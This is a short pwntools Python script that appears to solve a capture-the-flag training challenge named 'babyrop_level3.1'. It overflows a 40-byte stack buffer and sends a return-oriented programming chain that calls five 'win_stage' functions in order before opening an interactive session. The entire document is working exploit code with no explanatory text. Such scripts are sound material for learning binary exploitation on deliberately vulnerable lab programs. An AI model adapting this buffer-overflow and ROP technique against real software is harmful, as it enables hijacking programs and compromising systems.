from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level3.1")

io = elf.process()
buffer_len = 40 #0x20 = 32 + 8 = 40
rop = ROP(elf)

rop.win_stage_1(1)
rop.win_stage_2(2)
rop.win_stage_3(3)
rop.win_stage_4(4)
rop.win_stage_5(5)

PAYLOAD = b'A'*buffer_len + rop.chain()
io.sendline(PAYLOAD)
io.interactive()
